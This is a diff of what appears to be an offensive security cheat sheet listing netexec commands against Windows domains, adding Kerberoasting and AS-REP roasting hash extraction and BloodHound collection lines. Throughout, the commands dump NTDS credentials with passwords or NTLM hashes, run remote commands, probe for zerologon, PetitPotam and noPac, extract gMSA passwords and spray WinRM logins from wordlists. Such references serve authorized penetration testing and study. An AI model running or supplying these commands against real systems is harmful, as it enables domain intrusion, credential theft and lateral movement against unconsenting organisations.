@@ -669,7 +669,6 @@ $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --ntds --user <USERNAME>
 $ netexec smb <RHOST> -u '<USERNAME>' -H '<NTLMHASH>' --ntds --user <USERNAME>
 $ netexec smb <RHOST> -u '<USERNAME>' -H '<HASH>' -x "whoami"
 $ netexec smb /PATH/TO/FILE/<FILE> --gen-relay-list <FILE>
-$ netexec ldap <RHOST> -u '' -p '' --asreproast
 $ netexec ldap <RHOST> -u '' -p '' -M -user-desc
 $ netexec ldap <RHOST> -u '' -p '' -M get-desc-users
 $ netexec ldap <RHOST> -u '' -p '' -M ldap-checker
@@ -680,14 +679,17 @@ $ netexec ldap <RHOST> -u '' -p '' -M zerologon
 $ netexec ldap <RHOST> -u '' -p '' -M petitpotam
 $ netexec ldap <RHOST> -u '' -p '' -M nopac
 $ netexec ldap <RHOST> -u '' -p '' --use-kcache -M whoami
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa -k
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-convert-id <ID>
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --gmsa-decrypt-lsa <ACCOUNT>
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
-$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c all
 $ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --find-delegation
-$ netexec winrm <SUBNET>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M get-network -o ALL=true
+$ netexec ldap <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --bloodhound -ns <RHOST> -c All
+$ netexec ldap <RHOST> -u '<USERNAME>' --use-kcache --bloodhound --dns-tcp --dns-server <RHOST> -c All
+$ netexec winrm <NETWORK>/24 -u '<USERNAME>' -p '<PASSWORD>' -d .
 $ netexec winrm -u /t -p '<PASSWORD>' -d '<DOMAIN>' <RHOST>
 $ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST>
 $ netexec winrm <RHOST> -u /PATH/TO/FILE/<USERNAMES> -p /PATH/TO/WORDLIST/<WORDLIST> --ignore-pw-decoding
